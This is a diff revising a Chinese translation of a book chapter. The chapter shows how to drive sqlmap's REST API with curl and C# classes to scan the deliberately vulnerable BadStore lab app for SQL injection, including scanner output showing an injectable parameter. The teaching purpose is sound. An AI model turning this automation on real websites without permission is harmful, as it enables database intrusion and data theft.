-这些选项将通过后续的 API 调用来测试给定的 URL 是否存在 SQL 注入。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。在使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。（注：此处根据上下文意译翻译）。
+使用 sqlmap API 时，我们需要创建一个任务来测试给定的 URL 是否存在 SQL 注入。任务通过任务 ID 识别，我们在列表 9-4 的 API 选项中用它替换 `taskid`。
 
 这些选项将通过后续的 API 调用来测试给定的 URL 是否存在 SQL 注入。
 
 # 使用 curl 测试 sqlmap API
 
-通常，sqlmap 会在命令行上运行，但通过 curl 测试 API，我们可以让 sqlmap 在后端执行 SQL 注入扫描扫描，如列表 9-5 所示。在 127.0.0.1:8775 上运行：
+通常，sqlmap 会在命令行上运行，但通过 curl 测试 API，我们可以让 sqlmap 在后端执行 SQL 注入扫描扫描，如列表 9-5 所示。在 `127.0.0.1:8775` 上运行：
 
 ```bash
 $ curl 127.0.0.1:8775/task/new
@@ -5488,9 +5556,10 @@ $ curl 127.0.0.1:8775/task/new
   "success":true
 }
 ```
+
 列表 9-5：使用 curl 创建新的 sqlmap 任务
 
-在这里，post 请求返回一个新的 task ID。确保你的 sqlmap 服务器正在运行，如列表 9-2 所示。在向 `/task/new` 发送简单的 GET 请求后，它会返回一个新的 task ID。我们将使用这个 task ID 来进行其他 API 调用，例如启动和停止任务。为了查看该任务的所有选项，我们可以使用 task ID 对应的 API 调用，如列表 9-6 所示。
+在这里，POST 请求返回一个新的 task ID。确保你的 sqlmap 服务器正在运行，如列表 9-2 所示。在向 `/task/new` 发送简单的 GET 请求后，它会返回一个新的 task ID。我们将使用这个 task ID 来进行其他 API 调用，例如启动和停止任务。为了查看该任务的所有选项，我们可以使用 task ID 对应的 API 调用，如列表 9-6 所示。
 
 ```json
 {
@@ -5508,11 +5577,14 @@ $ curl 127.0.0.1:8775/task/new
   "keepAlive": false
 }
 ```
+
 列表 9-6：列出任务的选项
 
-每个任务选项都对应 sqlmap 命令行参数。这些选项决定了 sqlmap 如何执行 SQL 注入扫描以及如何利用发现的任何注入漏洞。列表 9-6 显示的有趣选项之一是注入技术（echo）的设置；它设置为默认的 BEUSTQ 以测试所有注入类型。你还可以看到导出用户数据库的选项（在本例中 ①）以及导出密码哈希的选项（②）。如果你对所有选项感兴趣，可以在命令行运行 `sqlmap --help` 来查看选项描述和用法。
 
-在创建扫描并查看当前状态后，我们可以设置其中一个选项并启动扫描。为了设置特定选项，我们发送 POST 请求并包含 sqlmap 将设置到选项中的数据。列表 9-7 详细介绍了如何使用 curl 测试新 URL 的 sqlmap。
+
+每个任务选项都对应`sqlmap`命令行参数。这些选项决定了`sqlmap`如何执行 SQL 注入扫描以及如何利用发现的任何注入漏洞。列表 9-6 显示的有趣选项之一是注入技术（`echo`）的设置；它设置为默认的`BEUSTQ`以测试所有注入类型。你还可以看到导出用户数据库的选项（在本例中 ①）以及导出密码哈希的选项（②）。如果你对所有选项感兴趣，可以在命令行运行`sqlmap --help`来查看选项描述和用法。
+
+在创建扫描并查看当前状态后，我们可以设置其中一个选项并启动扫描。为了设置特定选项，我们发送 POST 请求并包含`sqlmap`将设置到选项中的数据。列表 9-7 详细介绍了如何使用`curl`测试新 URL 的`sqlmap`。
 
 ```bash
 $ curl -X POST -H "Content-Type:application/json" \
@@ -5523,8 +5595,8 @@ $ curl -X POST -H "Content-Type:application/json" \
 "success":true
 }
 ```
-列表 9-7：使用选项启动 sqlmap 扫描
 
+列表 9-7：使用选项启动`sqlmap`扫描
 
 ```json
 {
@@ -5534,9 +5606,9 @@ $ curl -X POST -H "Content-Type:application/json" \
 }
 ```
 
-列表 9-8：获取 sqlmap 扫描状态
+列表 9-8：获取`sqlmap`扫描状态
 
-扫描运行完成后，sqlmap 将扫描状态更改为 terminated（已终止）。一旦扫描结束，我们可以使用日志端点检索扫描日志，并查看 sqlmap 在扫描期间发现了什么，如列表 9-9 所示。
+扫描运行完成后，`sqlmap`将扫描状态更改为`terminated`（已终止）。一旦扫描结束，我们可以使用日志端点检索扫描日志，并查看`sqlmap`在扫描期间发现了什么，如列表 9-9 所示。
 
 ```curl
 curl 127.0.0.1:8775/scan/dce7f6a991c5238/log
@@ -5560,7 +5632,7 @@ curl 127.0.0.1:8775/scan/dce7f6a991c5238/log
 
 列表 9-9：请求扫描日志
 
-sqlmap 扫描日志是一个状态数组，每个状态都包含消息（message）、消息级别（message level）和时间戳（timestamp）。扫描日志让我们直观地 sqlmap 扫描给定 URL 时发生的情况，包括任何注入参数。一旦完成扫描并获得结果，我们应该清理掉消耗的资源。要删除任务，可以使用 `/task/taskid/delete`，如列表 9-10 所示。在 API 中可以自由创建和删除任务，因此请随意创建新任务、尝试运行然后删除它们。
+`sqlmap`扫描日志是一个状态数组，每个状态都包含消息（`message`）、消息级别（`message level`）和时间戳（`timestamp`）。扫描日志让我们直观地看到`sqlmap`扫描给定 URL 时发生的情况，包括任何注入参数。一旦完成扫描并获得结果，我们应该清理掉消耗的资源。要删除任务，可以使用`/task/taskid/delete`，如列表 9-10 所示。在 API 中可以自由创建和删除任务，因此请随意创建新任务、尝试运行然后删除它们。
 
 ```curl
 curl 127.0.0.1:8775/task/dce7f6a991c5238/delete
@@ -5569,15 +5641,15 @@ curl 127.0.0.1:8775/task/dce7f6a991c5238/delete
 }
 ```
 
-列表 9-10：在 sqlmap API 中删除任务
+列表 9-10：在`sqlmap` API 中删除任务
 
-调用 `/task/taskid/delete` 端点后，API 将返回任务状态以及是否已成功删除。现在我们已经掌握了创建、运行和删除 sqlmap 扫描的标准工作流，可以开始编写 C# 类来实现从头到尾的整个过程自动化。
+调用`/task/taskid/delete`端点后，API 将返回任务状态以及是否已成功删除。现在我们已经掌握了创建、运行和删除`sqlmap`扫描的标准工作流，可以开始编写 C# 类来实现从头到尾的整个过程自动化。
 
 ## 为 sqlmap API 创建会话
 
-使用 REST API 不需要身份验证，因此我们可以轻松使用会话/管理器（session/manager）模式，这是一个与之前章节中其他 API 模式类似的简单模式。这种模式允许我们将协议的传输（我们如何与 API 通信）与协议暴露的功能（API 能做什么）分离。我们将实现 `SqlMapSession` 和 `SqlMapManager` 类来驱动 sqlmap API 自动发现并利用注入。
+使用 REST API 不需要身份验证，因此我们可以轻松使用会话/管理器（`session/manager`）模式，这是一个与之前章节中其他 API 模式类似的简单模式。这种模式允许我们将协议的传输（我们如何与 API 通信）与协议暴露的功能（API 能做什么）分离。我们将实现`SqlMapSession`和`SqlMapManager`类来驱动`sqlmap` API 自动发现并利用注入。
 
-我们将编写 `SqlMapSession` 类。该类所示于列表 9-11，只需要一个构造函数和两个名为 `ExecuteGet` 和 `ExecutePost()` 的方法。这两个方法将承担我们要编写的这两个类的大部分核心工作。它们将发出 HTTP 请求（分别用于 GET 请求，一个用于 POST 请求），允许我们的类与 sqlmap API 通信。
+我们将编写`SqlMapSession`类。该类所示于列表 9-11，只需要一个构造函数和两个名为`ExecuteGet`和`ExecutePost()`的方法。这两个方法将承担我们要编写的这两个类的大部分核心工作。它们将发出 HTTP 请求（分别用于 GET 请求，一个用于 POST 请求），允许我们的类与`sqlmap` API 通信。
 
 ```csharp
 public class SqlMapSession : IDisposable
@@ -5608,15 +5680,15 @@ public class SqlMapSession : IDisposable
 }
 ```
 
-> 列表 9-11：SqlMapSession 类
+> 列表 9-11：`SqlMapSession`类
 
-我们首先创建一个实现 `IDisposable` 接口的公共类 `SqlMapSession`。这允许我们使用 `using` 语句配合 `SqlMapSession`，从而能够编写更整洁的代码，并通过垃圾回收管理变量。我们还声明了两个私有字段：`host` 和 `port`，我们在发送 HTTP 请求时将使用它们。我们默认为 `_host` 变量分配 `string.Empty` 值。这是 C# 的一个特性，允许你在不实际实例化字符串对象的情况下为变量分配一个空字符串，从而带来轻微的性能提升（但目前只是为了分配一个默认值）。我们为 `_port` 变量分配 sqlmap 监听的端口，即默认的 8775。
+我们首先创建一个实现`IDisposable`接口的公共类`SqlMapSession`。这允许我们使用`using`语句配合`SqlMapSession`，从而能够编写更整洁的代码，并通过垃圾回收管理变量。我们还声明了两个私有字段：`host`和`port`，我们在发送 HTTP 请求时将使用它们。我们默认为`_host`变量分配`string.Empty`值。这是 C# 的一个特性，允许你在不实际实例化字符串对象的情况下为变量分配一个空字符串，从而带来轻微的性能提升（但目前只是为了分配一个默认值）。我们为`_port`变量分配`sqlmap`监听的端口，即默认的 8775。
 
-在声明私有字段后，我们创建了一个接受两个参数（主机机 `host` 和端口 `port`）的构造函数。我们将传递给构造函数的参数值赋值给私有字段，以便我们连接到正确的 API 主机和端口。我们还声明了两个用于执行 GET 和 POST 请求的存根方法（stub methods），它们返回 `string.Empty`。我们将定义这些方法。`ExecuteGet()` 方法只需要一个 URL 作为输入。`ExecutePost()` 方法需要一个 URL 和要发布的数据。最后，我们编写了 `Dispose()` 方法，这是实现 `IDisposable` 接口所要求的。在该方法内部，我们通过为私有字段分配 `null` 值来清理它们。
+在声明私有字段后，我们创建了一个接受两个参数（主机`host`和端口`port`）的构造函数。我们将传递给构造函数的参数值赋值给私有字段，以便我们连接到正确的 API 主机和端口。我们还声明了两个用于执行 GET 和 POST 请求的存根方法（`stub methods`），它们返回`string.Empty`。我们将定义这些方法。`ExecuteGet()`方法只需要一个 URL 作为输入。`ExecutePost()`方法需要一个 URL 和要发布的数据。最后，我们编写了`Dispose()`方法，这是实现`IDisposable`接口所要求的。在该方法内部，我们通过为私有字段分配`null`值来清理它们。
 
 ## 创建一个执行 GET 请求的方法
 
-列表 9-12 显示了如何使用 `HttpRequest` 来实现存根方法中的第一个一个，以执行 GET 请求并返回字符串。
+列表 9-12 显示了如何使用`HttpRequest`来实现存根方法中的第一个，以执行 GET 请求并返回字符串。
 
 ```csharp
 public string ExecuteGet(string url)
@@ -5632,17 +5704,15 @@ public string ExecuteGet(string url)
 }
 ```
 
-> 列表 9-12：ExecuteGet 方法
+> 列表 9-12：`ExecuteGet`方法
 
-我们创建一个包含 `_host`、`port` 和 `url` 的 `HttpRequest`。我们将 `Method` 设置为 GET。接下来，我们使用 `StreamReader` 将响应读取到字符串。反序列化是将字符串转换为对象的过程，而序列化的相反。
+我们创建一个包含`_host`、`port`和`url`的`HttpRequest`。我们将`Method`设置为 GET。接下来，我们使用`StreamReader`将响应读取到字符串。反序列化是将字符串转换为对象的过程，而序列化的相反。
 
 ## 执行 POST 请求
 
-sqlmap 扫描日志是一个状态数组，每个状态包含消息、消息级别时间和戳。扫描日志让我们直观地看到 sqlmap 扫描给定 URL 时发生的情况，包括任何注入参数。一旦完成扫描并获得结果，我们应该清理掉消耗的资源。
+`sqlmap`扫描日志是一个状态数组，每个状态包含消息、消息级别和时间戳。扫描日志让我们直观地看到`sqlmap`扫描给定 URL 时发生的情况，包括任何注入参数。一旦完成扫描并获得结果，我们应该清理掉消耗的资源。
 
-（注：此处原文中存在大量重复的段落，已根据要求保持翻译逻辑并避免重复输出）
-
-> 列表 9-13：ExecutePost 方法
+> 列表 9-13：`ExecutePost`方法
 
 ```csharp
 public string ExecutePost(string url, string data)
@@ -5659,7 +5729,7 @@ public string ExecutePost(string url, string data)
 }
 ```
 
-`ExecutePost()` 方法需要一个 URL 和要发布的数据。我们创建一个包含 `_host`、`port` 和 `url` 的 `HttpRequest`。我们将 `Method` 设置为 POST 并添加内容。然后我们使用 `StreamReader` 将响应读取到字符串。反序列化是将字符串转换为对象的过程，而序列化的相反。
+`ExecutePost()`方法需要一个 URL 和要发布的数据。我们创建一个包含`_host`、`port`和`url`的`HttpRequest`。我们将`Method`设置为 POST 并添加内容。然后我们使用`StreamReader`将响应读取到字符串。反序列化是将字符串转换为对象的过程，而序列化的相反。
 
 ## 测试 Session 类
 
@@ -5679,32 +5749,31 @@ public static void Main(string[] args)
 }
 ```
 
-我们现在准备好测试会话了。我们从程序的第一个和第二个参数分别获取主机和端口。然后我们调用 `int.Parse` 将字符串参数解析为整数。虽然我们在在本章中一直使用 8775 端口，但由于端口是可以配置（8775 是默认值），我们不应假设它总是 8775。
+我们现在准备好测试会话了。我们从程序的第一个和第二个参数分别获取主机和端口。然后我们调用`int.Parse`将字符串参数解析为整数。虽然我们在本章中一直使用 8775 端口，但由于端口是可以配置的（8775 是默认值），我们不应假设它总是 8775。
 
 # 注意
 
-C# 的一些标准类型具有 `Parse()` 方法，例如我们刚刚使用的 `int.Parse()`。`int` 类型是 `Int32`，它尝试解析 32 位整数。`Int16` 是 `short`，因此 `short.Parse()` 尝试解析 16 位整数。`long.Parse()` 尝试解析 64 位整数。`DateTime` 类也存在 `Parse()` 方法。这些方法都是静态的，因此不需要实例化对象。
+C# 的一些标准类型具有`Parse()`方法，例如我们刚刚使用的`int.Parse()`。`int`类型是`Int32`，它尝试解析 32 位整数。`Int16`是`short`，因此`short.Parse()`尝试解析 16 位整数。`long.Parse()`尝试解析 64 位整数。`DateTime`类也存在`Parse()`方法。这些方法都是静态的，因此不需要实例化对象。
 
-在将任务ID 发送到控制台 ⑤ 后，我们可以通过调用 `/task/taskID/delete` 端点来删除任务 ⑥。我们再次使用 `JObject` 类解析 JSON 响应并检索 `success` 键的值 ⑦，将其转换为布尔类型，并向用户显示任务已成功删除。当你运行工具时，它会产生关于删除任务的输出，如下所示：
+在将任务 ID 发送到控制台 ⑤ 后，我们可以通过调用`/task/taskID/delete`端点来删除任务 ⑥。我们再次使用`JObject`类解析 JSON 响应并检索`success`键的值 ⑦，将其转换为布尔类型，并向用户显示任务已成功删除。当你运行工具时，它会产生关于删除任务的输出，如下所示：
 
+# 列表 9-15
 
-
-
-
-# 列表 9-15。
 ```bash
 $ mono ./ch9_automating_sqlmap.exe 127.0.0.1 8775
 ```
 
 新任务 ID: 96d9fb9d277aa082
-删除任务: 96d9fb9d277aa082
-删除成功: True 列表 9-15: 运行创建并删除 sqlmap 任务程序
 
-一旦我们能够成功创建和删除任务，就可以创建 `SqlmapManager` 类，来封装我们未来想要使用的 API 功能，例如扫描选项和获取扫描结果。
+删除任务: 96d9fb9d277aa082
+
+删除成功: True 列表 9-15: 运行创建并删除`sqlmap`任务程序
+
+一旦我们能够成功创建和删除任务，就可以创建`SqlmapManager`类，来封装我们未来想要使用的 API 功能，例如扫描选项和获取扫描结果。
 
 ## SqlmapManager 类
 
-列表 9-16 所示的 `SqlmapManager` 类以一种易于使用（且易于维护！）的方式封装了通过 API 暴露的方法。当我们完成本章所需的方法的编写后，就可以对给定的 URL 进行扫描，等待其完成，然后检索结果并删除任务。我们还将大量使用 `Json.Net` 库。重申一下，会话/管理器模式（session/manager pattern）的目标是将 API 的传输与 API 暴露的功能隔离开。
+列表 9-16 所示的`SqlmapManager`类以一种易于使用（且易于维护！）的方式封装了通过 API 暴露的方法。当我们完成本章所需的方法的编写后，就可以对给定的 URL 进行扫描，等待其完成，然后检索结果并删除任务。我们还将大量使用`Json.Net`库。重申一下，会话/管理器模式（`session/manager pattern`）的目标是将 API 的传输与 API 暴露的功能隔离开。
 
 该模式的一个额外优点是它允许使用该库的程序员专注于结果的 API 调用。然而，如果需要，程序员也可以直接与会话进行交互。
 
@@ -5728,11 +5797,11 @@ public class SqlmapManager : IDisposable
 }
 ```
 
-列表 9-16: `SqlmapManager` 类 ① 并且必须实现 `IDisposable` 接口。我们还为 `SqlmapSession` 声明了一个私有字段 ②，它将贯穿整个类。然后，我们创建了 `SqlmapManager` 构造函数 ③，它接受一个 `SqlmapSession`，并将会话分配给私有字段 `_session`。
+列表 9-16: `SqlmapManager`类 ① 并且必须实现`IDisposable`接口。我们还为`SqlmapSession`声明了一个私有字段 ②，它将贯穿整个类。然后，我们创建了`SqlmapManager`构造函数 ③，它接受一个`SqlmapSession`，并将会话分配给私有字段`_session`。
 
-最后，我们实现了 `Dispose()` 方法 ④，它会清理私有的 `SqlSession`。你可能会奇怪，为什么我们的 `SqlSession` 和 `SqlManager` 都实现了 `IDisposable`，因为在 `SqlManager` 的 `Dispose()` 方法中，我们也对 `SqlSession` 调用了 `Dispose()`。程序员可能只想直接实例化 `SqlSession`，并在引入了管理器尚未更新以支持的新 API 端点时进行交互。让这两个类都实现 `IDisposable` 提供了最大的灵活性。
+最后，我们实现了`Dispose()`方法 ④，它会清理私有的`SqlSession`。你可能会奇怪，为什么我们的`SqlSession`和`SqlManager`都实现了`IDisposable`，因为在`SqlManager`的`Dispose()`方法中，我们也对`SqlSession`调用了`Dispose()`。程序员可能只想直接实例化`SqlSession`，并在引入了管理器尚未更新以支持的新 API 端点时进行交互。让这两个类都实现`IDisposable`提供了最大的灵活性。
 
-由于我们在列表 9-14 中测试 `SqlSession` 类时，刚刚实现了创建新任务和删除现有任务的方法，我们将这些这些操作作为独立的方法添加到上述 `SqlmapManager` 类的 `Dispose()` 方法上方，如列表 9-17 所示。
+由于我们在列表 9-14 中测试`SqlSession`类时，刚刚实现了创建新任务和删除现有任务的方法，我们将这些操作作为独立的方法添加到上述`SqlmapManager`类的`Dispose()`方法上方，如列表 9-17 所示。
 
 ```csharp
 public string newTask()
@@ -5750,11 +5819,11 @@ public bool DeleteTask(string task)
 }
 ```
 
-> 列表 9-17: `NewTask()` 和 `DeleteTask()` 方法使得在 sqlmap 中创建和删除任务变得简单
+> 列表 9-17: `NewTask()`和`DeleteTask()`方法使得在`sqlmap`中创建和删除任务变得简单
 
-`NewTask()` 和 `DeleteTask()` 使得在 `SqlMapManager` 类中按需创建和删除任务变得它们与列表 9-14 中的代码几乎相同，不同在于它们打印的内容较少，并且在创建新任务 ① 后返回任务 ID，或者在删除任务 ② 后返回结果（成功或失败）。
+`NewTask()`和`DeleteTask()`使得在`SqlMapManager`类中按需创建和删除任务变得简单。它们与列表 9-14 中的代码几乎相同，不同在于它们打印的内容较少，并且在创建新任务 ① 后返回任务 ID，或者在删除任务 ② 后返回结果（成功或失败）。
 
-现在，我们可以使用这些方法使用 `SqlSession` 类来重写之前的命令行应用程序，如列表 9-18 所示。
+现在，我们可以使用这些方法使用`SqlSession`类来重写之前的命令行应用程序，如列表 9-18 所示。
 
 ```csharp
 public static void Main(string[] args)
@@ -5773,9 +5842,11 @@ public static void Main(string[] args)
 }
 ```
 
-> 列表 9-18: 重写应用程序以使用 `SqlManager` 类并更便于快速理解
+> 列表 9-18: 重写应用程序以使用`SqlManager`类并更便于快速理解
 
-这段代码比列表 9-14 中的原始应用程序读起来更直观、更易于浏览。我们把创建和删除任务的代码替换为 `NewTask()` ① 和 `DeleteTask()` 方法。通过阅读代码，你完全不知道 API 使用 HTTP 作为传输层，或者不知道我们正在处理 JSON 响应。
+
+
+这段代码比列表 9-14 中的原始应用程序读起来更直观、更易于浏览。我们把创建和删除任务的代码替换为`NewTask()`①和`DeleteTask()`方法。通过阅读代码，你完全不知道 API 使用 HTTP 作为传输层，或者不知道我们正在处理 JSON 响应。
 
 ## 列出 sqlmap 选项
 
@@ -5796,9 +5867,9 @@ public Dictionary<string, object> GetOptions(string taskId)
 
 > 列表 9-19: `GetOptions()` 方法
 
-列表 9-19 中的 `GetOptions()` 方法 ① 接受一个参数：获取任务 ID。我们通过实例化字典开始该方法，该字典要求键为字符串并允许任何对象作为值。在调用 API 端点并解析响应 ③ 后，我们遍历对。最后返回设置的选项 ⑤，以便我们在启动任务时使用。
+列表 9-19 中的`GetOptions()`方法①接受一个参数：获取任务 ID。我们通过实例化字典开始该方法，该字典要求键为字符串并允许任何对象作为值。在调用 API 端点并解析响应③后，我们遍历对。最后返回设置的选项⑤，以便我们在启动任务时使用。
 
-我们将在很快实现的 `StartTask()` 方法中使用此选项字典来启动任务。不过，首先将列表 9-20 中的代码添加到你的应用程序中：
+我们将在很快实现的`StartTask()`方法中使用此选项字典来启动任务。不过，首先将列表 9-20 中的代码添加到你的应用程序中：
 
 ```csharp
 Dictionary<string, object> options = mgr.GetOptions(taskID);
@@ -5827,7 +5898,7 @@ Key:code:Value:False
 
 ## 执行扫描的方法
 
-使用 `Json.Net` 库使得 `StartTask()` 方法变得很短，因为它为我们处理所有的序列化和反序列化，如列表 9-22 所示
+使用`Json.Net`库使得`StartTask()`方法变得很短，因为它为我们处理所有的序列化和反序列化，如列表 9-22 所示
 
 ```csharp
 public bool StartTask(string taskID, Dictionary<string, object> opts)
@@ -5839,14 +5910,12 @@ public bool StartTask(string taskID, Dictionary<string, object> opts)
 ```
 
 列表 9-22: `StartTask()` 方法
-我们使用 `Json.NET` 类将整个对象转换为 JSON。
 
+我们使用`Json.NET`类将整个对象转换为 JSON。
 
+`SerializeObject()`方法用于获取表示选项字典的 JSON 字符串，我们可以将其发送到端点。然后，我们发送 API 请求并解析 JSON 响应。最后，我们返回 JSON 响应中`success`键的值，希望它为`true`。对于此 API 调用，响应中应该存在此 JSON 键，当任务成功启动时它为`true`，如果任务未启动则为`false`。
 
-
-`SerializeObject()` 方法用于获取表示选项字典的 JSON 字符串，我们可以将其发送到端点。然后，我们发送 API 请求并解析 JSON 响应。最后，我们返回 JSON 响应中 `success` 键的值，希望它为 `true`。对于此 API 调用，响应中应该存在此 JSON 键，当任务成功启动时它为 `true`，如果任务未启动则为 `false`。
-
-了解任务何时完成也是非常有用的。这样你就可以获取任务的完整日志以及何时删除任务。为了获取任务状态，我们实现了一个小类（如列表 9-23），它表示来自 `/scan/taskid/status` API 端点的 sqlmap 状态响应。如果你愿意，可以将其添加到新类中，尽管这是一个非常短的类。
+了解任务何时完成也是非常有用的。这样你就可以获取任务的完整日志以及何时删除任务。为了获取任务状态，我们实现了一个小类（如列表 9-23），它表示来自`/scan/taskid/status`API 端点的 sqlmap 状态响应。如果你愿意，可以将其添加到新类中，尽管这是一个非常短的类。
 
 ```c
 public class SqlmapStatus {
@@ -5857,9 +5926,9 @@ public class SqlmapStatus {
 
 列表 9-23: 定义构造函数的 SqlmapStatus 类，是因为，
 
-对于 `SqlmapStatus` 类，我们不需要定义构造函数，因为默认情况下，每个类都有一个公共构造函数。我们在类上定义了两个公共属性：一个字符串状态消息和一个整数返回代码。为了获取任务状态并将其存储在 `SqlmapStatus` 中，我们实现了 `GetScanStatus`，它接受 `taskid` 作为输入并返回一个 `SqlmapStatus` 对象。
+对于`SqlmapStatus`类，我们不需要定义构造函数，因为默认情况下，每个类都有一个公共构造函数。我们在类上定义了两个公共属性：一个字符串状态消息和一个整数返回代码。为了获取任务状态并将其存储在`SqlmapStatus`中，我们实现了`GetScanStatus`，它接受`taskid`作为输入并返回一个`SqlmapStatus`对象。
 
-`GetScanStatus()` 方法在列表 9-24 中。
+`GetScanStatus()`方法在列表 9-24 中。
 
 ```csharp
 SqlmapStatus GetScanStatus(string taskid){
@@ -5877,11 +5946,11 @@ SqlmapStatus GetScanStatus(string taskid){
 
 列表 9-24: 我们之前定义的 GetScanStatus() 方法，用于
 
-我们使用 `Execute()` 方法来检索包含任务扫描状态信息的 JSON 对象（`/scan/taskid/`）。在调用 API 端点后，我们创建一个新的 `SqlmapStatus` 对象，并将 API 调用的状态值赋值给 `Status` 属性。`returncode` JSON 值不为空时，我们将其转换为整数并将结果赋值给 `ReturnCode` 属性。最后，我们将 `SqlmapStatus` 对象返回给调用者。
+我们使用`Execute()`方法来检索包含任务扫描状态信息的 JSON 对象（`/scan/taskid/`）。在调用 API 端点后，我们创建一个新的`SqlmapStatus`对象，并将 API 调用的状态值赋值给`Status`属性。`returncode`JSON 值不为空时，我们将其转换为整数并将结果赋值给`ReturnCode`属性。最后，我们将`SqlmapStatus`对象返回给调用者。
 
-# # 新的 Main() 方法
+## 新的 Main() 方法
 
-现在，我们将为命令行应用程序添加逻辑，以便能够扫描我们在第 2 章中利用的 BadStore 内的漏洞搜索页面并监控扫描过程。首先，在调用 `DeleteTask` 之前，将列表 9-25 所示的代码添加到 `Main()` 方法中。
+现在，我们将为命令行应用程序添加逻辑，以便能够扫描我们在第 2 章中利用的 BadStore 内的漏洞搜索页面并监控扫描过程。首先，在调用`DeleteTask`之前，将列表 9-25 所示的代码添加到`Main()`方法中。
 
 ```csharp
 options["url"] = "http://192.168.1.75/cgi-bin/badstore.cgi?" +
@@ -5897,11 +5966,11 @@ Console.WriteLine("Scan finished!");
 
 列表 9-25: 在主 sqlmap 应用程序中启动并结束扫描。
 
-将 IP 地址 ① 替换为你想要扫描的 BadStore IP。在应用程序为 `options` 字典分配 `url` 键后，它将使用新选项 ② 任务并获取扫描状态 ③，此时状态应该是正在运行的。然后，应用程序将循环 ④ 直到扫描状态变为 `terminated`，这意味着扫描已完成。应用程序一旦退出循环，就会打印“Scan finished!”⑤。
+将 IP 地址①替换为你想要扫描的 BadStore IP。在应用程序为`options`字典分配`url`键后，它将使用新选项②任务并获取扫描状态③，此时状态应该是正在运行的。然后，应用程序将循环④直到扫描状态变为`terminated`，这意味着扫描已完成。应用程序一旦退出循环，就会打印“Scan finished!”⑤。
 
-# # 报告扫描结果
+## 报告扫描结果
 
-为了查看 sqlmap 是否可以利用任何漏洞参数，我们将创建一个 `SqlMapLogItem` 类来检索扫描日志，如列表 9-26 所示。
+为了查看 sqlmap 是否可以利用任何漏洞参数，我们将创建一个`SqlMapLogItem`类来检索扫描日志，如列表 9-26 所示。
 
 ```csharp
 public class SqlMapLogItem {
@@ -5913,9 +5982,9 @@ public class SqlMapLogItem {
 
 列表 9-26: SqlMapLogItem 类，Level 和 Time。Message 属性
 
-该类只有三个属性：`Message`、`Level` 和 `Time`。`Message` 属性包含描述日志项的消息。`Level` 控制 sqlmap 在报告中打印多少信息，可以是 `Error`（错误）、`Warn`（警告）或 `Info`（信息）。每个日志项仅有这些级别中的一个，这使得以后搜索特定类型的日志项变得很容易（例如，当你只想打印错误而不打印警告或信息项时）。`Errors` 通常是致命的，而 `warnings` 意味着某些地方有问题但 sqlmap 可以继续运行。`Information` 项仅仅是：关于扫描正在做什么或发现了什么的的基础信息，例如正在测试的注入类型。最后，`Time` 是我们记录的项。
+该类只有三个属性：`Message`、`Level`和`Time`。`Message`属性包含描述日志项的消息。`Level`控制 sqlmap 在报告中打印多少信息，可以是`Error`（错误）、`Warn`（警告）或`Info`（信息）。每个日志项仅有这些级别中的一个，这使得以后搜索特定类型的日志项变得很容易（例如，当你只想打印错误而不打印警告或信息项时）。`Errors`通常是致命的，而`warnings`意味着某些地方有问题但 sqlmap 可以继续运行。`Information`项仅仅是：关于扫描正在做什么或发现了什么的的基础信息，例如正在测试的注入类型。最后，`Time`是我们记录的项。
 
-接下来，我们实现 `GetLog()` 方法来返回这些 `SqlmapLogItems` 列表，并通过对 `/scan/taskid/log` 端点执行 GET 请求来检索日志，如列表 9-27 所示。
+接下来，我们实现`GetLog()`方法来返回这些`SqlmapLogItems`列表，并通过对`/scan/taskid/log`端点执行 GET 请求来检索日志，如列表 9-27 所示。
 
 ```csharp
 public List<SqlmapLogItems> GetLog(string task)
@@ -5937,11 +6006,11 @@ public List<SqlmapLogItems> GetLog(string task)
 
 列表 9-27: GetLog() 方法
 
-我们在 `GetLog()` 中执行的第一操作是对端点进行请求并将其解析为 `JObject`。`log` 键是一个数组，因此我们将其转换为 `JArray`。一旦获取了这些项的数组，我们就创建一个 `SqlmapLogItem` 列表。我们遍历每个项并实例化一个新的 `SqlmapLogItem`。最后，我们将项添加到列表中并返回列表。
+我们在`GetLog()`中执行的第一操作是对端点进行请求并将其解析为`JObject`。`log`键是一个数组，因此我们将其转换为`JArray`。一旦获取了这些项的数组，我们就创建一个`SqlmapLogItem`列表。我们遍历每个项并实例化一个新的`SqlmapLogItem`。最后，我们将项添加到列表中并返回列表。
 
-# # 自动化完整扫描
+## 自动化完整扫描
 
-我们将在扫描结束后从控制台调用 `GetLog()` 并消息打印到屏幕上。你的应用程序逻辑如列表 9-28 所示。
+我们将在扫描结束后从控制台调用`GetLog()`并消息打印到屏幕上。你的应用程序逻辑如列表 9-28 所示。
 
 ```csharp
 public static void Main(string[] args)
@@ -5978,35 +6047,45 @@ public static void Main(string[] args)
 
 列表 9-28: 用于自动化 sqlmap 扫描 URL 的 Full 方法。
 
-
-
-
 GET 参数 'searchquery' 似乎存在 MySQL <= 5.0.11 或时间盲注（heavy query'）注入测试 'Generic UNION query (NULL) - 1 to 20 columns'
+
 自动扩展 UNION 注入技术测试的范围，
+
 因为发现至少存在另一种（潜在的）技术
+
 ORDER BY 技术似乎可用。这应该减少找到正确查询列数所需。自动扩展
+
 UNION 注入技术测试的范围
+
 目标 URL 在查询中似乎有 4 列
+
 GET 参数 'searchquery' 存在 Generic UNION query (NULL) - 1 to 20
+
 列的可注入性
+
 DBMS 是 MySQL
 
 列表 9-29：*在受漏洞的 BadStore URL 上运行 sqlmap 应用*
+
 它成功了！sqlmap 的输出可能非常详尽，对于不习惯阅读它的人来说可能会令人困惑。尽管内容可能很多，但仍有一些关键点需要关注。正如你在输出中看到的，sqlmap 发现 searchquery 参数容易受到基于时间的 SQL 注入
+
 ① 存在基于 UNION 的 SQL 注入 ② 数据库是 MySQL
+
 ③ 其余的消息是关于 sqlmap 在扫描期间执行的操作的信息。通过这些结果，我们可以很容易地说 sqlmap 至少存在两种 SQL 注入技术。
 
-# 将 sqlmap 集成到 SOAP Fuzzer
+## 将 sqlmap 集成到 SOAP Fuzzer
 
